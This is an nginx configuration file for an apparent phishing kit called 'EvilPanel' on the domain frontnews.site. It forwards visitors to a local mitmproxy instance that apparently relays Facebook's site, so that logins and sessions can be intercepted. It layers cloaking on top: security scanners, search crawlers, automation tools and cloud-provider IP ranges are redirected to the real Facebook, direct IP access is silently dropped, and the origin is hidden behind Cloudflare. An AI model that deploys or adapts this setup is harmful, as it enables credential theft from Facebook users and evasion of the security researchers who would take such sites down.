# EvilPanel Nginx Configuration for frontnews.site
# Multi-layer cloaking with bot detection and reverse proxy to mitmproxy
#
# Cloaking Layers:
#   Layer 1: Cloudflare - Origin IP hidden, DDoS protection
#   Layer 2: Nginx - Geographic + Bot UA patterns → redirect to Facebook
#   Layer 3: mitmproxy_addon.py - Obfuscated detection with threat levels
#
# Usage:
#   cp nginx-frontnews.conf /etc/nginx/sites-available/frontnews
#   ln -s /etc/nginx/sites-available/frontnews /etc/nginx/sites-enabled/
#   nginx -t && systemctl reload nginx

# ==================== CLOUDFLARE IP RANGES ====================
# Only accept connections from Cloudflare - hide origin IP
# Updated: December 2024 - https://www.cloudflare.com/ips/
set_real_ip_from 173.245.48.0/20;
set_real_ip_from 103.21.244.0/22;
set_real_ip_from 103.22.200.0/22;
set_real_ip_from 103.31.4.0/22;
set_real_ip_from 141.101.64.0/18;
set_real_ip_from 108.162.192.0/18;
set_real_ip_from 190.93.240.0/20;
set_real_ip_from 188.114.96.0/20;
set_real_ip_from 197.234.240.0/22;
set_real_ip_from 198.41.128.0/17;
set_real_ip_from 162.158.0.0/15;
set_real_ip_from 104.16.0.0/13;
set_real_ip_from 104.24.0.0/14;
set_real_ip_from 172.64.0.0/13;
set_real_ip_from 131.0.72.0/22;
# IPv6
set_real_ip_from 2400:cb00::/32;
set_real_ip_from 2606:4700::/32;
set_real_ip_from 2803:f800::/32;
set_real_ip_from 2405:b500::/32;
set_real_ip_from 2405:8100::/32;
set_real_ip_from 2a06:98c0::/29;
set_real_ip_from 2c0f:f248::/32;

real_ip_header CF-Connecting-IP;

# ==================== SCANNER IP BLOCKS ====================
# Block major cloud provider CIDR ranges commonly used by scanners
geo $is_scanner_ip {
    default 0;
    # AWS ranges (common scanner source)
    3.0.0.0/8 1;
    18.0.0.0/8 1;
    52.0.0.0/8 1;
    54.0.0.0/8 1;
    # GCP ranges
    35.0.0.0/8 1;
    34.0.0.0/8 1;
    # Azure ranges
    40.0.0.0/8 1;
    20.0.0.0/8 1;
    # DigitalOcean ranges (except our own)
    # 206.189.92.6 is our server - don't block
    # Linode ranges
    45.33.0.0/16 1;
    45.56.0.0/16 1;
    # Vultr ranges
    45.32.0.0/16 1;
    45.63.0.0/16 1;
    # Known security scanner networks
    185.180.143.0/24 1;  # Censys
    162.142.125.0/24 1;  # Censys
    167.248.133.0/24 1;  # Censys
    71.6.0.0/16 1;       # Shodan
    93.174.95.0/24 1;    # Shodan
    66.240.192.0/18 1;   # Shodan
}

# ==================== BOT USER-AGENT MAPPING ====================
# Maps suspicious user agents to redirect flag
# 0 = real user (allow), 1 = bot (redirect to Facebook)
map $http_user_agent $is_bot {
    default 0;
    
    # Search engine crawlers
    ~*googlebot 1;
    ~*bingbot 1;
    ~*yandexbot 1;
    ~*baiduspider 1;
    ~*duckduckbot 1;
    ~*facebookexternalhit 1;
    ~*facebot 1;
    ~*slurp 1;
    ~*sogou 1;
    ~*exabot 1;
    ~*ia_archiver 1;
    ~*msnbot 1;
    
    # Security scanners and analysis tools
    ~*nessus 1;
    ~*nikto 1;
    ~*sqlmap 1;
    ~*burp 1;
    ~*acunetix 1;
    ~*nmap 1;
    ~*nuclei 1;
    ~*masscan 1;
    ~*censys 1;
    ~*shodan 1;
    ~*zgrab 1;
    ~*wpscan 1;
    ~*dirbuster 1;
    ~*gobuster 1;
    ~*ffuf 1;
    ~*feroxbuster 1;
    
    # Automation tools
    ~*headless 1;
    ~*phantomjs 1;
    ~*selenium 1;
    ~*puppeteer 1;
    ~*playwright 1;
    ~*webdriver 1;
    ~*chrome-lighthouse 1;
    ~*pagespeed 1;
    
    # Generic bot patterns
    ~*bot 1;
    ~*crawler 1;
    ~*spider 1;
    ~*scraper 1;
    ~*curl 1;
    ~*wget 1;
    ~*python-requests 1;
    ~*python-urllib 1;
    ~*java/ 1;
    ~*go-http-client 1;
    ~*axios 1;
    ~*node-fetch 1;
    ~*libwww 1;
    ~*httpie 1;
    ~*postman 1;
    ~*insomnia 1;
    
    # Link checkers
    ~*linkchecker 1;
    ~*checkbot 1;
    ~*w3c 1;
    ~*validator 1;
    
    # Empty or missing user agent
    "" 1;
}

# ==================== BLOCK DIRECT IP ACCESS ====================
# Reject connections that bypass Cloudflare (direct IP access)
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _;
    
    # Silent close - no response (stealth)
    return 444;
}

server {
    listen 443 ssl default_server;
    listen [::]:443 ssl default_server;
    server_name _;
    
    # Self-signed cert for default server (required for SSL)
    ssl_certificate /etc/letsencrypt/live/frontnews.site/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/frontnews.site/privkey.pem;
    
    # Silent close - no response (stealth)
    return 444;
}

# ==================== HTTP → HTTPS REDIRECT ====================
server {
    listen 80;
    listen [::]:80;
    server_name frontnews.site *.frontnews.site;
    
    # Scanner IP block - redirect to Facebook
    if ($is_scanner_ip) {
        return 301 https://www.facebook.com/;
    }
    
    # Bot detection at HTTP level
    if ($is_bot) {
        return 301 https://www.facebook.com/;
    }
    
    return 301 https://$host$request_uri;
}

# ==================== MAIN HTTPS SERVER ====================
server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name m.frontnews.site www.frontnews.site frontnews.site;
    
    # SSL Configuration (Let's Encrypt)
    ssl_certificate /etc/letsencrypt/live/frontnews.site/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/frontnews.site/privkey.pem;
    
    # Modern SSL settings
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;
    ssl_session_timeout 1d;
    ssl_session_cache shared:SSL:10m;
    ssl_session_tickets off;
    ssl_stapling on;
    ssl_stapling_verify on;
    
    # DNS resolver for OCSP stapling
    resolver 8.8.8.8 8.8.4.4 valid=300s;
    resolver_timeout 5s;
    
    # ==================== CLOAKING LAYER 1: SCANNER IP BLOCK ====================
    # Block known scanner IP ranges - redirect to real Facebook
    if ($is_scanner_ip) {
        return 301 https://www.facebook.com/;
    }
    
    # ==================== CLOAKING LAYER 2: BOT REDIRECT ====================
    # Bots get redirected to real Facebook (cloaking)
    if ($is_bot) {
        return 301 https://www.facebook.com/;
    }
    
    # ==================== ROOT DOMAIN REDIRECT ====================
    # Redirect bare domain to mobile subdomain
    if ($host = frontnews.site) {
        return 301 https://m.frontnews.site$request_uri;
    }
    
    # ==================== PROXY HEADERS ====================
    # Required headers for proper proxy operation
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_set_header X-Forwarded-Host $host;
    proxy_set_header Connection "";
    
    # WebSocket support (for Facebook's real-time features)
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
    
    # Timeouts (allow long-running connections)
    proxy_connect_timeout 60s;
    proxy_send_timeout 60s;
    proxy_read_timeout 60s;
    send_timeout 60s;
    
    # Buffer settings
    proxy_buffer_size 128k;
    proxy_buffers 4 256k;
    proxy_busy_buffers_size 256k;
    
    # ==================== MAIN LOCATION ====================
    location / {
        # Pass to mitmproxy on port 8443
        proxy_pass https://127.0.0.1:8443;
        
        # SSL verification for upstream
        proxy_ssl_verify off;
        proxy_ssl_server_name on;
    }
    
    # ==================== STATIC ASSETS OPTIMIZATION ====================
    # Cache static assets (images, CSS, JS from Facebook CDN)
    location ~* \.(jpg|jpeg|png|gif|ico|css|js|woff|woff2|ttf|svg)$ {
        proxy_pass https://127.0.0.1:8443;
        proxy_ssl_verify off;
        
        # Cache headers
        expires 1h;
        add_header Cache-Control "public, immutable";
    }
    
    # ==================== SECURITY HEADERS ====================
    # Note: Most security headers are stripped by mitmproxy addon
    # These are for nginx-level responses only
    add_header X-Content-Type-Options "nosniff" always;
    
    # ==================== ACCESS LOGGING ====================
    access_log /var/log/nginx/frontnews.access.log;
    error_log /var/log/nginx/frontnews.error.log warn;
}

# ==================== HEALTH CHECK ENDPOINT ====================
# Separate server for health checks (optional, for monitoring)
server {
    listen 8080;
    listen [::]:8080;
    server_name localhost;
    
    location /health {
        return 200 "OK\n";
        add_header Content-Type text/plain;
    }
    
    location /nginx-status {
        stub_status on;
        allow 127.0.0.1;
        deny all;
    }
}
